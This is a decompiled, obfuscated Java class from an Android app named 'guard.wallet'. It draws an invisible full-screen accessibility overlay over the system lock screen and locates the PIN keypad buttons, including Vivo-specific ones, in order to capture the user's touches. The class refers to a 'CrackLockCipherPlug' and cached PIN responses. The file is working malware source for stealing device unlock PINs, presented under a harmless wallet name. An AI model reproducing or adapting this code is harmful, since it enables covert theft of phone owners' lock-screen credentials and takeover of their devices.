package com.guard.wallet.helper;

import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.PointCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import java.util.stream.Stream;

public abstract class r {
   public static WindowManager a;
   public static final AtomicReference b = new AtomicReference();
   public static final com.guard.wallet.plug.f c = new com.guard.wallet.plug.f();
   public static final ReentrantLock d = new ReentrantLock();
   public static ReqListenHelper e;
   public static Integer f = -1;
   public static final ConcurrentLinkedQueue g = new ConcurrentLinkedQueue();
   public static final AtomicReference h = new AtomicReference(null);
   public static final AtomicReference i = new AtomicReference(null);
   public static final AtomicReference j = new AtomicReference(null);

   static {
      Executors.newFixedThreadPool(10);
   }

   public static CombineFilter a() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/delete_button", null, null));
      return var0;
   }

   public static CombineFilter b() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key_enter", null, null));
      return var0;
   }

   public static CombineFilter c() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
      var0.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/key", null, null));
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void d(o.e var0, CombineFilter var1) {
      Exception var10000;
      label166: {
         AtomicReference var3;
         try {
            var3 = b;
            if (var3.get() != null) {
               return;
            }
         } catch (Exception var24) {
            var10000 = var24;
            boolean var10001 = false;
            break label166;
         }

         ReqListenHelper var4;
         try {
            var4 = e;
         } catch (Exception var23) {
            var10000 = var23;
            boolean var33 = false;
            break label166;
         }

         if (var4 == null) {
            return;
         }

         try {
            if (Objects.equals(var4.getListenType(), 1) && !com.guard.wallet.utils.g.p0()) {
               e = null;
               return;
            }
         } catch (Exception var22) {
            var10000 = var22;
            boolean var34 = false;
            break label166;
         }

         label150: {
            boolean var2;
            label149: {
               label148: {
                  ConcurrentLinkedQueue var5;
                  try {
                     if (MainApplication.getInstance() == null || MainApplication.getInstance().getCrackLockCipherPlug() == null) {
                        break label150;
                     }

                     var26 = MainApplication.getInstance().getCrackLockCipherPlug();
                     var26.getClass();
                     var5 = com.guard.wallet.plug.c.a;
                     if (var5.isEmpty()) {
                        Log.e("com.guard.wallet.plug.c", "cacheResponseQueue is Empty");
                        break label148;
                     }
                  } catch (Exception var21) {
                     var10000 = var21;
                     boolean var35 = false;
                     break label166;
                  }

                  try {
                     Stream var6 = var5.stream();
                     p var28 = new p(var26, 1);
                     var2 = var6.anyMatch(var28);
                     break label149;
                  } catch (Exception var20) {
                     var10000 = var20;
                     boolean var36 = false;
                     break label166;
                  }
               }

               var2 = false;
            }

            if (var2) {
               try {
                  Log.e("com.guard.wallet.helper.r", "CrackLockCipherPlug hasPinCacheResponse exit");
                  e = null;
                  return;
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var37 = false;
                  break label166;
               }
            }
         }

         AtomicReference var7;
         Rect var8;
         LayoutParams var29;
         AtomicReference var30;
         try {
            f = -1;
            g.clear();
            var27 = c;
            var27.c.clear();
            var27.b.clear();
            var27.a = null;
            var30 = h;
            var30.set(null);
            i.set(null);
            var7 = j;
            var7.set(null);
            var29 = new LayoutParams();
            var29.flags = 4786090;
            var29.format = 1;
            var29.alpha = 1.0F;
            var29.dimAmount = 0.01F;
            var29.gravity = 8388659;
            var29.x = 0;
            var29.y = 0;
            var29.width = com.guard.wallet.utils.e.e().getWidth();
            var29.height = com.guard.wallet.utils.e.e().getHeight();
            MyAccessibilityService.P().getClass();
            var8 = MyAccessibilityService.O();
         } catch (Exception var19) {
            var10000 = var19;
            boolean var38 = false;
            break label166;
         }

         if (var8 != null) {
            try {
               if (var8.width() > var29.width) {
                  var29.width = var8.width();
               }
            } catch (Exception var18) {
               var10000 = var18;
               boolean var39 = false;
               break label166;
            }
         }

         try {
            var31 = new View(MyAccessibilityService.P());
            var31.setBackgroundColor(0);
            var31.setAlpha(1.0F);
            if (a == null) {
               a = (WindowManager)MyAccessibilityService.P().getSystemService("window");
            }
         } catch (Exception var17) {
            var10000 = var17;
            boolean var40 = false;
            break label166;
         }

         ReqListenHelper var32;
         try {
            var29.type = 2032;
            q var9 = new q(var0, var1);
            var31.setOnTouchListener(var9);
            var32 = e;
         } catch (Exception var16) {
            var10000 = var16;
            boolean var41 = false;
            break label166;
         }

         if (var32 == null) {
            return;
         }

         try {
            if (Objects.equals(var32.getListenType(), 1) && !com.guard.wallet.utils.g.p0()) {
               e = null;
               return;
            }
         } catch (Exception var15) {
            var10000 = var15;
            boolean var42 = false;
            break label166;
         }

         try {
            if (var3.get() == null) {
               a.addView(var31, var29);
               var3.set(var31);
               Log.e("com.guard.wallet.helper.r", "TouchView 已创建完成");
               var27.a = ReqListenHelper.clone(e);
            }
         } catch (Exception var14) {
            var10000 = var14;
            boolean var43 = false;
            break label166;
         }

         try {
            if (!n(var0, var1)) {
               Log.e("com.guard.wallet.helper.r", "PIN码按键查找失败");
               if (!com.guard.wallet.utils.e.i()) {
                  g(false);
                  return;
               }
            }
         } catch (Exception var13) {
            var10000 = var13;
            boolean var44 = false;
            break label166;
         }

         try {
            if (var30.get() == null) {
               h(var0);
            }
         } catch (Exception var12) {
            var10000 = var12;
            boolean var45 = false;
            break label166;
         }

         try {
            if (var7.get() == null) {
               i(var0);
            }

            return;
         } catch (Exception var11) {
            var10000 = var11;
            boolean var46 = false;
         }
      }

      Exception var25 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var25);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void e(o.e var0, CombineFilter var1, ReqListenHelper var2) {
      Exception var10000;
      label80: {
         ReqListenHelper var4;
         try {
            if (MyAccessibilityService.P() == null || k()) {
               return;
            }

            var4 = e;
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label80;
         }

         if (var4 != null) {
            return;
         }

         ReentrantLock var14 = d;

         label77: {
            try {
               if (!var14.tryLock()) {
                  return;
               }

               e = ReqListenHelper.clone(var2);
               if (com.guard.wallet.utils.k.a()) {
                  d(var0, var1);
                  break label77;
               }
            } catch (Exception var10) {
               var10000 = var10;
               boolean var15 = false;
               break label80;
            }

            try {
               Handler var5 = new Handler(Looper.getMainLooper());
               o.d var13 = new o.d(var0, var1, 8);
               var5.post(var13);
            } catch (Exception var8) {
               var10000 = var8;
               boolean var16 = false;
               break label80;
            }

            int var3 = 0;

            while (true) {
               try {
                  if (k()) {
                     break;
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var17 = false;
                  break label80;
               }

               if (var3 >= 10) {
                  break;
               }

               try {
                  com.guard.wallet.utils.g.T0(1);
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var18 = false;
                  break label80;
               }

               var3++;
            }
         }

         try {
            var14.unlock();
            return;
         } catch (Exception var6) {
            var10000 = var6;
            boolean var19 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var12);
   }

   public static void f() {
      try {
         if (a != null) {
            AtomicReference var0 = b;
            if (var0.get() != null) {
               ((View)var0.get()).setOnTouchListener(null);
               a.removeViewImmediate((View)var0.get());
               var0.set(null);
               Log.e("com.guard.wallet.helper.r", "TouchView 已销毁完成");
            }
         }

         f = -1;
         g.clear();
         h.set(null);
         i.set(null);
         j.set(null);
      } catch (Exception var1) {
         a1.q.s("com.guard.wallet.helper.r", var1);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void g(boolean var0) {
      Exception var10000;
      label62: {
         boolean var1;
         ReentrantLock var2;
         try {
            if (!k()) {
               return;
            }

            var2 = d;
            var1 = var2.tryLock();
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label62;
         }

         if (!var1) {
            return;
         }

         com.guard.wallet.plug.f var3 = c;
         if (var0) {
            try {
               var3.a();
            } catch (Exception var9) {
               var10000 = var9;
               boolean var13 = false;
               break label62;
            }
         } else {
            try {
               var3.c.clear();
               var3.b.clear();
               var3.a = null;
            } catch (Exception var8) {
               var10000 = var8;
               boolean var14 = false;
               break label62;
            }
         }

         label46: {
            try {
               e = null;
               if (com.guard.wallet.utils.k.a()) {
                  f();
                  break label46;
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var15 = false;
               break label62;
            }

            try {
               Handler var4 = new Handler(Looper.getMainLooper());
               f var12 = new f(4);
               var4.post(var12);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var16 = false;
               break label62;
            }
         }

         try {
            var2.unlock();
            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var17 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var11);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void h(o.e var0) {
      Exception var10000;
      label82: {
         CombineFilter var1;
         label83: {
            try {
               if (com.guard.wallet.utils.e.i()) {
                  var1 = l();
                  break label83;
               }
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label82;
            }

            try {
               if (com.guard.wallet.utils.e.l()) {
                  var1 = o();
                  break label83;
               }
            } catch (Exception var9) {
               var10000 = var9;
               boolean var15 = false;
               break label82;
            }

            try {
               var1 = a();
            } catch (Exception var8) {
               var10000 = var8;
               boolean var16 = false;
               break label82;
            }
         }

         UiObject var2;
         try {
            var2 = var0.n(var1);
         } catch (Exception var7) {
            var10000 = var7;
            boolean var17 = false;
            break label82;
         }

         AtomicReference var11 = h;
         if (var2 != null) {
            try {
               var2 = var2.findOneByCombine(var1);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var18 = false;
               break label82;
            }

            if (var2 != null) {
               try {
                  var11.set(var2);
                  return;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var21 = false;
                  break label82;
               }
            }
         }

         try {
            var13 = MyAccessibilityService.Q().findOneByCombine(var1);
         } catch (Exception var5) {
            var10000 = var5;
            boolean var19 = false;
            break label82;
         }

         if (var13 == null) {
            return;
         }

         try {
            var11.set(var13);
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var20 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var12);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void i(o.e var0) {
      Exception var10000;
      label78: {
         CombineFilter var1;
         label74: {
            label79: {
               try {
                  if (com.guard.wallet.utils.e.i()) {
                     break label79;
                  }
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var10001 = false;
                  break label78;
               }

               try {
                  if (com.guard.wallet.utils.e.l()) {
                     var1 = p();
                     break label74;
                  }
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var15 = false;
                  break label78;
               }

               try {
                  var1 = b();
                  break label74;
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var16 = false;
                  break label78;
               }
            }

            var1 = null;
         }

         if (var1 == null) {
            return;
         }

         UiObject var2;
         try {
            var2 = var0.n(var1);
         } catch (Exception var7) {
            var10000 = var7;
            boolean var17 = false;
            break label78;
         }

         AtomicReference var11 = j;
         if (var2 != null) {
            try {
               var2 = var2.findOneByCombine(var1);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var18 = false;
               break label78;
            }

            if (var2 != null) {
               try {
                  var11.set(var2);
                  return;
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var21 = false;
                  break label78;
               }
            }
         }

         try {
            var13 = MyAccessibilityService.Q().findOneByCombine(var1);
         } catch (Exception var5) {
            var10000 = var5;
            boolean var19 = false;
            break label78;
         }

         if (var13 == null) {
            return;
         }

         try {
            var11.set(var13);
            return;
         } catch (Exception var4) {
            var10000 = var4;
            boolean var20 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var12);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static UiObject j(o.e var0, Point var1) {
      Exception var10000;
      label40: {
         CombineFilter var2;
         try {
            var2 = new CombineFilter();
            LinkedList var3 = new LinkedList();
            var2.setPointConditions(var3);
            List var12 = var2.getPointConditions();
            PointCondition var4 = new PointCondition(var1.getX(), var1.getY(), 1);
            var12.add(var4);
            LinkedList var10 = new LinkedList();
            var2.setBoolConditions(var10);
            List var13 = var2.getBoolConditions();
            BoolCondition var11 = new BoolCondition("clickable", true, true);
            var13.add(var11);
         } catch (Exception var7) {
            var10000 = var7;
            boolean var10001 = false;
            break label40;
         }

         label33:
         if (var0 != null) {
            try {
               if (var0.k() == null) {
                  break label33;
               }

               var8 = var0.k().findLastByCombine(var2);
            } catch (Exception var6) {
               var10000 = var6;
               boolean var14 = false;
               break label40;
            }

            if (var8 != null) {
               return var8;
            }
         }

         try {
            if (MyAccessibilityService.Q() != null) {
               return MyAccessibilityService.Q().findLastByCombine(var2);
            }

            return null;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var15 = false;
         }
      }

      Exception var9 = var10000;
      a1.q.s("com.guard.wallet.helper.r", var9);
      return null;
   }

   public static boolean k() {
      return b.get() != null;
   }

   public static CombineFilter l() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
      var0.getStringConditions().add(new StringCondition("desc", "删除", null, null, null, null));
      return var0;
   }

   public static CombineFilter m() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("className", "android.view.View", null, null, null, null));
      var0.getStringConditions().add(new StringCondition("desc", null, null, null, null, "\\d"));
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean n(o.e var0, CombineFilter var1) {
      label137: {
         Exception var10000;
         label139: {
            try {
               if (e == null) {
                  return false;
               }
            } catch (Exception var18) {
               var10000 = var18;
               boolean var10001 = false;
               break label139;
            }

            label140: {
               try {
                  if (!Objects.equals(1, e.getListenType())) {
                     break label140;
                  }

                  if (com.guard.wallet.utils.e.i()) {
                     var1 = m();
                     break label140;
                  }
               } catch (Exception var17) {
                  var10000 = var17;
                  boolean var25 = false;
                  break label139;
               }

               try {
                  if (com.guard.wallet.utils.e.l()) {
                     var1 = q();
                     break label140;
                  }
               } catch (Exception var16) {
                  var10000 = var16;
                  boolean var26 = false;
                  break label139;
               }

               try {
                  var1 = c();
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var27 = false;
                  break label139;
               }
            }

            if (var1 == null) {
               return false;
            }

            int var2 = 0;

            ConcurrentLinkedQueue var4;
            while (true) {
               try {
                  var4 = g;
                  if (var4.size() == 10) {
                     break;
                  }
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var28 = false;
                  break label139;
               }

               if (var2 >= 5) {
                  break;
               }

               try {
                  var0.k().refresh();
                  com.guard.wallet.utils.g.T0(2);
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var29 = false;
                  break label139;
               }

               label143: {
                  label144: {
                     UiObject var3;
                     try {
                        var4.clear();
                        var3 = var0.n(var1);
                     } catch (Exception var14) {
                        var10000 = var14;
                        boolean var30 = false;
                        break label144;
                     }

                     label145: {
                        if (var3 != null) {
                           try {
                              var20 = var3.findByCombine(var1);
                           } catch (Exception var12) {
                              var10000 = var12;
                              boolean var31 = false;
                              break label144;
                           }

                           if (var20 != null) {
                              try {
                                 if (var20.size() > 0) {
                                    var22 = var20.getNodes();
                                    break label145;
                                 }
                              } catch (Exception var13) {
                                 var10000 = var13;
                                 boolean var32 = false;
                                 break label144;
                              }
                           }
                        }

                        try {
                           var21 = MyAccessibilityService.Q().findByCombine(var1);
                        } catch (Exception var11) {
                           var10000 = var11;
                           boolean var33 = false;
                           break label144;
                        }

                        if (var21 == null) {
                           break label143;
                        }

                        try {
                           if (var21.size() <= 0) {
                              break label143;
                           }

                           var22 = var21.getNodes();
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var34 = false;
                           break label144;
                        }
                     }

                     try {
                        var4.addAll(var22);
                        break label143;
                     } catch (Exception var9) {
                        var10000 = var9;
                        boolean var35 = false;
                     }
                  }

                  Exception var23 = var10000;

                  try {
                     a1.q.s("com.guard.wallet.helper.r", var23);
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var36 = false;
                     break label139;
                  }
               }

               var2++;
            }

            try {
               if (var4.size() == 10) {
                  Log.e("com.guard.wallet.helper.r", "PIN码按键查找成功");
                  return true;
               }
               break label137;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var37 = false;
            }
         }

         Exception var19 = var10000;
         a1.q.s("com.guard.wallet.helper.r", var19);
      }

      Log.e("com.guard.wallet.helper.r", "cacheTouchNodes not found");
      return false;
   }

   public static CombineFilter o() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_cancel", null, null, null, null));
      return var0;
   }

   public static CombineFilter p() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("id", "com.android.systemui:id/vivo_pin_confirm", null, null, null, null));
      return var0;
   }

   public static CombineFilter q() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      var0.setPointConditions(new LinkedList<>());
      var0.setStringConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      var0.getStringConditions().add(new StringCondition("className", "android.view.ViewGroup", null, null, null, null));
      var0.getStringConditions().add(new StringCondition("id", null, null, "com.android.systemui:id/VivoPinkey", null, null));
      return var0;
   }
}
